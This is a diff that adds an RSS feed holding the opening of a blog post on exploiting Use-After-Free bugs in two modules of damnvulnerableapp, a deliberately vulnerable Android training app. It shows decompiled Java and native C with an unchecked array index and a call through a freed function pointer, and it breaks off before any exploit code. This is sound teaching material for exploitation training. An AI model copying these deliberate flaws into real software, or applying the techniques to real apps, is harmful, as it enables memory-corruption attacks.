@@ -1,0 +1,729 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Use After Free on lolcads tech blog</title><link>https://lolcads.github.io/tags/use-after-free/</link><description>Recent content in Use After Free on lolcads tech blog</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><copyright>&amp;copy; lolcads</copyright><lastBuildDate>Wed, 24 Jul 2024 16:46:21 +0100</lastBuildDate><atom:link href="https://lolcads.github.io/tags/use-after-free/index.xml" rel="self" type="application/rss+xml"/><item><title>E²VA: Use After Free Write/Execute Module (Part 4)</title><link>https://lolcads.github.io/posts/2024/07/eva_3/</link><pubDate>Wed, 24 Jul 2024 16:46:21 +0100</pubDate><guid>https://lolcads.github.io/posts/2024/07/eva_3/</guid><description>Exploitation of Use - After - Free Modules In this post we will be discussing how to exploit a Use - After - Free bug in both UseAfterFreeExecModule and UseAfterFreeWriteModule. As the names of the modules suggest, they differ in terms of the impact the bug has. To that end, in UseAfterFreeExecModule we will be able to control a function pointer, whereas in UseAfterFreeWriteModule we are given a Write - What - Where condition.</description><content>&lt;h1 id="exploitation-of-use---after---free-modules">Exploitation of &lt;em>Use - After - Free&lt;/em> Modules&lt;/h1>
+&lt;p>In this post we will be discussing how to exploit a &lt;em>Use - After - Free&lt;/em> bug in both &lt;em>UseAfterFreeExecModule&lt;/em> and &lt;em>UseAfterFreeWriteModule&lt;/em>. As the names of the modules suggest, they differ in terms of the impact the bug has. To that end, in &lt;em>UseAfterFreeExecModule&lt;/em> we will be able to control a function pointer, whereas in &lt;em>UseAfterFreeWriteModule&lt;/em> we are given a &lt;em>Write - What - Where&lt;/em> condition.&lt;/p>
+&lt;h2 id="about-this-post">About this post&lt;/h2>
+&lt;p>Before we jump into details I want to make a few things clear about this post. The initial part of this post will be about &lt;strong>failing&lt;/strong> to exploit the &lt;em>Use - After - Free&lt;/em> bug that enables a &lt;em>Write - What - Where&lt;/em> condition. Thus the initial part will contain a lot of incomplete approaches of getting code execution. This is also why this post covers two modules at the same time, because initially there only was the &lt;em>UseAfterFreeWriteModule&lt;/em>, but it was too hard to start with, so I introduced &lt;em>UseAfterFreeExecModule&lt;/em> and derived a technique that is applicable to both modules.&lt;/p>
+&lt;p>If you are not interested in reading about one of the core pillars of binary exploitation, i.e. &lt;strong>failure&lt;/strong>, then feel free to skip to the &lt;a href="#coming-back-from-useafterfreeexecmodule">fun part&lt;/a> :)&lt;/p>
+&lt;h2 id="assumptions">Assumptions&lt;/h2>
+&lt;p>We will assume that we have successfully grabbed a copy of the &lt;code>.apk&lt;/code> file of &lt;em>damnvulnerableapp&lt;/em>. Also, we will &lt;strong>not&lt;/strong> discuss how to unpack an &lt;code>.apk&lt;/code> file, but rather assume that we have access to &lt;code>libUseAfterFree(Exec/Write)Module.so&lt;/code> and the &lt;code>UseAfterFree(Exec/Write)Module&lt;/code> class. If it is unclear how to get access to these components when only given an &lt;code>.apk&lt;/code> file, read the previous blog posts first!&lt;/p>
+&lt;h2 id="analysis-baseline">Analysis baseline&lt;/h2>
+&lt;p>As we have access to the &lt;code>.apk&lt;/code> file, we can utilize &lt;a href="https://github.com/skylot/jadx">&lt;em>jadx&lt;/em>&lt;/a> to get the source code of &lt;code>UseAfterFreeExecModule&lt;/code>:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-Java" data-lang="Java">&lt;span style="color:#75715e">/* loaded from: classes10.dex */&lt;/span>
+&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">UseAfterFreeExecModule&lt;/span> &lt;span style="color:#66d9ef">extends&lt;/span> VulnerableModule &lt;span style="color:#f92672">{&lt;/span>
+&lt;span style="color:#66d9ef">private&lt;/span> &lt;span style="color:#66d9ef">native&lt;/span> &lt;span style="color:#66d9ef">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#a6e22e">lookupExamples&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#66d9ef">int&lt;/span> i&lt;span style="color:#f92672">);&lt;/span>
+&lt;span style="color:#66d9ef">private&lt;/span> &lt;span style="color:#66d9ef">native&lt;/span> &lt;span style="color:#66d9ef">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#a6e22e">storePair&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#66d9ef">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> bArr&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span> j&lt;span style="color:#f92672">);&lt;/span>
+&lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
+System&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">loadLibrary&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;UseAfterFreeExecModule&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
+&lt;span style="color:#f92672">}&lt;/span>
+&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#a6e22e">UseAfterFreeExecModule&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
+&lt;span style="color:#66d9ef">super&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#66d9ef">new&lt;/span> UseAfterFreeExecModuleConfiguration&lt;span style="color:#f92672">());&lt;/span>
+&lt;span style="color:#f92672">}&lt;/span>
+&lt;span style="color:#a6e22e">@Override&lt;/span> &lt;span style="color:#75715e">// com.damnvulnerableapp.vulnerable.modules.VulnerableModule
+&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#66d9ef">throws&lt;/span> VulnerableModuleException &lt;span style="color:#f92672">{&lt;/span>
+output&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;Key - Value Storage! Most secure in this field!&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getBytes&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
+&lt;span style="color:#66d9ef">while&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#66d9ef">true&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
+output&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;Send a number between 1 and 4 (0 to continue) to see one of four key name templates:&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getBytes&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
+&lt;span style="color:#66d9ef">int&lt;/span> index &lt;span style="color:#f92672">=&lt;/span> ByteBuffer&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">wrap&lt;/span>&lt;span style="color:#f92672">(&lt;/span>input&lt;span style="color:#f92672">()).&lt;/span>&lt;span style="color:#a6e22e">getInt&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
+&lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>index &lt;span style="color:#f92672">==&lt;/span> 0&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
+&lt;span style="color:#66d9ef">break&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
+&lt;span style="color:#f92672">}&lt;/span>
+output&lt;span style="color:#f92672">(&lt;/span>lookupExamples&lt;span style="color:#f92672">(&lt;/span>index &lt;span style="color:#f92672">-&lt;/span> 1&lt;span style="color:#f92672">));&lt;/span>
+&lt;span style="color:#f92672">}&lt;/span>
+&lt;span style="color:#66d9ef">while&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#66d9ef">true&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
+output&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;Please provide the key name (EXIT to end app): &amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getBytes&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
+&lt;span style="color:#66d9ef">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> name &lt;span style="color:#f92672">=&lt;/span> input&lt;span style="color:#f92672">();&lt;/span>
+&lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#66d9ef">new&lt;/span> String&lt;span style="color:#f92672">(&lt;/span>name&lt;span style="color:#f92672">).&lt;/span>&lt;span style="color:#a6e22e">toUpperCase&lt;/span>&lt;span style="color:#f92672">(&lt;/span>Locale&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">ROOT&lt;/span>&lt;span style="color:#f92672">).&lt;/span>&lt;span style="color:#a6e22e">equals&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;EXIT&amp;#34;&lt;/span>&lt;span style="color:#f92672">))&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
+output&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;Terminating...&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getBytes&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
+&lt;span style="color:#66d9ef">return&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
+&lt;span style="color:#f92672">}&lt;/span>
+output&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;Please provide the key value: &amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getBytes&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
+&lt;span style="color:#66d9ef">long&lt;/span> value &lt;span style="color:#f92672">=&lt;/span> ByteBuffer&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">wrap&lt;/span>&lt;span style="color:#f92672">(&lt;/span>input&lt;span style="color:#f92672">()).&lt;/span>&lt;span style="color:#a6e22e">getLong&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
+&lt;span style="color:#66d9ef">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> result &lt;span style="color:#f92672">=&lt;/span> storePair&lt;span style="color:#f92672">(&lt;/span>name&lt;span style="color:#f92672">,&lt;/span> value&lt;span style="color:#f92672">);&lt;/span>
+output&lt;span style="color:#f92672">(&lt;/span>result&lt;span style="color:#f92672">);&lt;/span>
+&lt;span style="color:#f92672">}&lt;/span>
+&lt;span style="color:#f92672">}&lt;/span>
+&lt;span style="color:#f92672">}&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>and &lt;code>UseAfterFreeWriteModule&lt;/code>:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-Java" data-lang="Java">&lt;span style="color:#75715e">/* loaded from: classes10.dex */&lt;/span>
+&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">UseAfterFreeWriteModule&lt;/span> &lt;span style="color:#66d9ef">extends&lt;/span> VulnerableModule &lt;span style="color:#f92672">{&lt;/span>
+&lt;span style="color:#66d9ef">private&lt;/span> &lt;span style="color:#66d9ef">native&lt;/span> &lt;span style="color:#66d9ef">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#a6e22e">lookupExamples&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#66d9ef">int&lt;/span> i&lt;span style="color:#f92672">);&lt;/span>
+&lt;span style="color:#66d9ef">private&lt;/span> &lt;span style="color:#66d9ef">native&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">storePair&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#66d9ef">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> bArr&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span> j&lt;span style="color:#f92672">);&lt;/span>
+&lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
+System&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">loadLibrary&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;UseAfterFreeWriteModule&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
+&lt;span style="color:#f92672">}&lt;/span>
+&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#a6e22e">UseAfterFreeWriteModule&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
+&lt;span style="color:#66d9ef">super&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#66d9ef">new&lt;/span> UseAfterFreeWriteModuleConfiguration&lt;span style="color:#f92672">());&lt;/span>
+&lt;span style="color:#f92672">}&lt;/span>
+&lt;span style="color:#a6e22e">@Override&lt;/span> &lt;span style="color:#75715e">// com.damnvulnerableapp.vulnerable.modules.VulnerableModule
+&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#66d9ef">throws&lt;/span> VulnerableModuleException &lt;span style="color:#f92672">{&lt;/span>
+output&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;Key - Value Storage! Most secure in this field!&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getBytes&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
+&lt;span style="color:#66d9ef">while&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#66d9ef">true&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
+output&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;Send a number between 1 and 4 (0 to continue) to see one of four key name templates:&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getBytes&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
+&lt;span style="color:#66d9ef">int&lt;/span> index &lt;span style="color:#f92672">=&lt;/span> ByteBuffer&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">wrap&lt;/span>&lt;span style="color:#f92672">(&lt;/span>input&lt;span style="color:#f92672">()).&lt;/span>&lt;span style="color:#a6e22e">getInt&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
+&lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>index &lt;span style="color:#f92672">==&lt;/span> 0&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
+&lt;span style="color:#66d9ef">break&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
+&lt;span style="color:#f92672">}&lt;/span>
+output&lt;span style="color:#f92672">(&lt;/span>lookupExamples&lt;span style="color:#f92672">(&lt;/span>index &lt;span style="color:#f92672">-&lt;/span> 1&lt;span style="color:#f92672">));&lt;/span>
+&lt;span style="color:#f92672">}&lt;/span>
+&lt;span style="color:#66d9ef">while&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#66d9ef">true&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
+output&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;Please provide the key name (EXIT to end app): &amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getBytes&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
+&lt;span style="color:#66d9ef">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> name &lt;span style="color:#f92672">=&lt;/span> input&lt;span style="color:#f92672">();&lt;/span>
+&lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#66d9ef">new&lt;/span> String&lt;span style="color:#f92672">(&lt;/span>name&lt;span style="color:#f92672">).&lt;/span>&lt;span style="color:#a6e22e">toUpperCase&lt;/span>&lt;span style="color:#f92672">(&lt;/span>Locale&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">ROOT&lt;/span>&lt;span style="color:#f92672">).&lt;/span>&lt;span style="color:#a6e22e">equals&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;EXIT&amp;#34;&lt;/span>&lt;span style="color:#f92672">))&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
+output&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;Terminating...&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getBytes&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
+&lt;span style="color:#66d9ef">return&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
+&lt;span style="color:#f92672">}&lt;/span>
+output&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;Please provide the key value: &amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getBytes&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
+&lt;span style="color:#66d9ef">long&lt;/span> value &lt;span style="color:#f92672">=&lt;/span> ByteBuffer&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">wrap&lt;/span>&lt;span style="color:#f92672">(&lt;/span>input&lt;span style="color:#f92672">()).&lt;/span>&lt;span style="color:#a6e22e">getLong&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
+storePair&lt;span style="color:#f92672">(&lt;/span>name&lt;span style="color:#f92672">,&lt;/span> value&lt;span style="color:#f92672">);&lt;/span>
+output&lt;span style="color:#f92672">((&lt;/span>&lt;span style="color:#e6db74">&amp;#34;Successfully stored (&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> String&lt;span style="color:#f92672">(&lt;/span>name&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#34;:&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> value &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#34;)!&amp;#34;&lt;/span>&lt;span style="color:#f92672">).&lt;/span>&lt;span style="color:#a6e22e">getBytes&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
+&lt;span style="color:#f92672">}&lt;/span>
+&lt;span style="color:#f92672">}&lt;/span>
+&lt;span style="color:#f92672">}&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>In both cases, we can see that:&lt;/p>
+&lt;ol>
+&lt;li>An arbitrary amount of integers can be passed to &lt;code>lookupExamples&lt;/code>. There seem to be &lt;strong>no bounds checks&lt;/strong>!&lt;/li>
+&lt;li>An arbitrary amount of &lt;em>key - value&lt;/em> pairs can be stored using &lt;code>storePair&lt;/code>. Notice that the &lt;em>value&lt;/em> is an 8 - byte integer.&lt;/li>
+&lt;/ol>
+&lt;p>Now, for the shared - object files we can use &lt;a href="https://ghidra-sre.org/">&lt;em>Ghidra&lt;/em>&lt;/a>. Starting with &lt;code>libUseAfterFreeExecModule.so&lt;/code> yields the (already beautified) code:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-C" data-lang="C">jbyteArray
+&lt;span style="color:#a6e22e">Java_com_damnvulnerableapp_vulnerable_modules_UseAfterFreeExecModule_lookupExamples&lt;/span>
+(JNIEnv &lt;span style="color:#f92672">*&lt;/span>env, jobject this, jint index)
+{
+&lt;span style="color:#66d9ef">long&lt;/span> lVar1;
+undefined4 length;
+jbyteArray array;
+&lt;span style="color:#66d9ef">long&lt;/span> in_FS_OFFSET;
+&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>examples [&lt;span style="color:#ae81ff">4&lt;/span>];
+canary &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">*&lt;/span>(&lt;span style="color:#66d9ef">long&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)(in_FS_OFFSET &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0x28&lt;/span>);
+examples[&lt;span style="color:#ae81ff">2&lt;/span>]._0_4_ &lt;span style="color:#f92672">=&lt;/span> PTR_s_topsecret_key_00101d40._0_4_;
+examples[&lt;span style="color:#ae81ff">2&lt;/span>]._4_4_ &lt;span style="color:#f92672">=&lt;/span> PTR_s_topsecret_key_00101d40._4_4_;
+examples[&lt;span style="color:#ae81ff">3&lt;/span>]._0_4_ &lt;span style="color:#f92672">=&lt;/span> PTR_s_a_very_very_long_key_with_fancy__00101d48._0_4_;
+examples[&lt;span style="color:#ae81ff">3&lt;/span>]._4_4_ &lt;span style="color:#f92672">=&lt;/span> PTR_s_a_very_very_long_key_with_fancy__00101d48._4_4_;
+examples[&lt;span style="color:#ae81ff">0&lt;/span>]._0_4_ &lt;span style="color:#f92672">=&lt;/span> PTR_s_amazing_key_00101d30._0_4_;
+examples[&lt;span style="color:#ae81ff">0&lt;/span>]._4_4_ &lt;span style="color:#f92672">=&lt;/span> PTR_s_amazing_key_00101d30._4_4_;
+examples[&lt;span style="color:#ae81ff">1&lt;/span>]._0_4_ &lt;span style="color:#f92672">=&lt;/span> PTR_s_secret_key_00101d38._0_4_;
+examples[&lt;span style="color:#ae81ff">1&lt;/span>]._4_4_ &lt;span style="color:#f92672">=&lt;/span> PTR_s_secret_key_00101d38._4_4_;
+length &lt;span style="color:#f92672">=&lt;/span> __strlen_chk(examples[(&lt;span style="color:#66d9ef">int&lt;/span>)index],&lt;span style="color:#ae81ff">0xffffffffffffffff&lt;/span>);
+array &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#f92672">*&lt;/span>(&lt;span style="color:#f92672">*&lt;/span>env)&lt;span style="color:#f92672">-&amp;gt;&lt;/span>NewByteArray)(env,(jsize)length);
+(&lt;span style="color:#f92672">*&lt;/span>(&lt;span style="color:#f92672">*&lt;/span>env)&lt;span style="color:#f92672">-&amp;gt;&lt;/span>SetByteArrayRegion)(env,array,&lt;span style="color:#ae81ff">0&lt;/span>,(jsize)length,(jbyte &lt;span style="color:#f92672">*&lt;/span>)(examples &lt;span style="color:#f92672">+&lt;/span> (&lt;span style="color:#66d9ef">int&lt;/span>)index));
+&lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#f92672">*&lt;/span>(&lt;span style="color:#66d9ef">long&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)(in_FS_OFFSET &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0x28&lt;/span>) &lt;span style="color:#f92672">==&lt;/span> canary) {
+&lt;span style="color:#66d9ef">return&lt;/span> array;
+}
+&lt;span style="color:#75715e">/* WARNING: Subroutine does not return */&lt;/span>
+__stack_chk_fail();
+}
+jbyteArray
+&lt;span style="color:#a6e22e">Java_com_damnvulnerableapp_vulnerable_modules_UseAfterFreeExecModule_storePair&lt;/span>
+(JNIEnv &lt;span style="color:#f92672">*&lt;/span>env,jobject this,jbyteArray name,jlong value)
+{
+uint resultLength;
+&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#f92672">*&lt;/span>obj;
+object &lt;span style="color:#f92672">*&lt;/span>keyValue;
+jsize nameLength;
+jbyte &lt;span style="color:#f92672">*&lt;/span>nameBytes;
+jbyteArray array;
+&lt;span style="color:#66d9ef">long&lt;/span> in_FS_OFFSET;
+uint len;
+&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>result;
+jboolean iscopy;
+&lt;span style="color:#66d9ef">long&lt;/span> canary;
+canary &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">*&lt;/span>(&lt;span style="color:#66d9ef">long&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)(in_FS_OFFSET &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0x28&lt;/span>);
+obj &lt;span style="color:#f92672">=&lt;/span> malloc(&lt;span style="color:#ae81ff">0x108&lt;/span>);
+&lt;span style="color:#f92672">*&lt;/span>(code &lt;span style="color:#f92672">**&lt;/span>)((&lt;span style="color:#66d9ef">long&lt;/span>)obj &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0x100&lt;/span>) &lt;span style="color:#f92672">=&lt;/span> FUN_00100c60;
+free(obj);
+keyValue &lt;span style="color:#f92672">=&lt;/span> (object &lt;span style="color:#f92672">*&lt;/span>)calloc(&lt;span style="color:#ae81ff">1&lt;/span>,&lt;span style="color:#ae81ff">0x108&lt;/span>);
+nameLength &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#f92672">*&lt;/span>(&lt;span style="color:#f92672">*&lt;/span>env)&lt;span style="color:#f92672">-&amp;gt;&lt;/span>GetArrayLength)(env,name);
+len &lt;span style="color:#f92672">=&lt;/span> (uint)nameLength;
+&lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#ae81ff">0x100&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> len) {
+len &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x100&lt;/span>;
+}
+iscopy &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;\0&amp;#39;&lt;/span>;
+nameBytes &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#f92672">*&lt;/span>(&lt;span style="color:#f92672">*&lt;/span>env)&lt;span style="color:#f92672">-&amp;gt;&lt;/span>GetByteArrayElements)(env,name,&lt;span style="color:#f92672">&amp;amp;&lt;/span>iscopy);
+__memcpy_chk(keyValue,nameBytes,len,&lt;span style="color:#ae81ff">0xffffffffffffffff&lt;/span>);
+keyValue&lt;span style="color:#f92672">-&amp;gt;&lt;/span>value &lt;span style="color:#f92672">=&lt;/span> value;
+result &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)(&lt;span style="color:#f92672">**&lt;/span>(code &lt;span style="color:#f92672">**&lt;/span>)((&lt;span style="color:#66d9ef">long&lt;/span>)obj &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0x100&lt;/span>))(keyValue,&lt;span style="color:#ae81ff">0&lt;/span>);
+resultLength &lt;span style="color:#f92672">=&lt;/span> __strlen_chk(&lt;span style="color:#f92672">&amp;amp;&lt;/span>result,&lt;span style="color:#ae81ff">0xffffffffffffffff&lt;/span>);
+array &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#f92672">*&lt;/span>(&lt;span style="color:#f92672">*&lt;/span>env)&lt;span style="color:#f92672">-&amp;gt;&lt;/span>NewByteArray)(env,(jsize)resultLength);
+(&lt;span style="color:#f92672">*&lt;/span>(&lt;span style="color:#f92672">*&lt;/span>env)&lt;span style="color:#f92672">-&amp;gt;&lt;/span>SetByteArrayRegion)(env,array,&lt;span style="color:#ae81ff">0&lt;/span>,(jsize)resultLength,(jbyte &lt;span style="color:#f92672">*&lt;/span>)&lt;span style="color:#f92672">&amp;amp;&lt;/span>result);
+(&lt;span style="color:#f92672">*&lt;/span>(&lt;span style="color:#f92672">*&lt;/span>env)&lt;span style="color:#f92672">-&amp;gt;&lt;/span>ReleaseByteArrayElements)(env,name,nameBytes,JNI_ABORT);
+free(keyValue);
+&lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#f92672">*&lt;/span>(&lt;span style="color:#66d9ef">long&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)(in_FS_OFFSET &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0x28&lt;/span>) &lt;span style="color:#f92672">==&lt;/span> canary) {
+&lt;span style="color:#66d9ef">return&lt;/span> array;
+}
+&lt;span style="color:#75715e">/* WARNING: Subroutine does not return */&lt;/span>
+__stack_chk_fail();
+}
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>As &lt;code>UseAfterFreeExecModule#lookupExamples&lt;/code> and &lt;code>UseAfterFreeWriteModule#lookupExamples&lt;/code> are basically the same (verfiy if not convinced), we will only consider &lt;code>UseAfterFreeWriteModule#storePair&lt;/code>:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-C" data-lang="C">&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">Java_com_damnvulnerableapp_vulnerable_modules_UseAfterFreeWriteModule_storePair&lt;/span>
+(JNIEnv &lt;span style="color:#f92672">*&lt;/span>env,jobject this,jarray key,jlong value)
+{
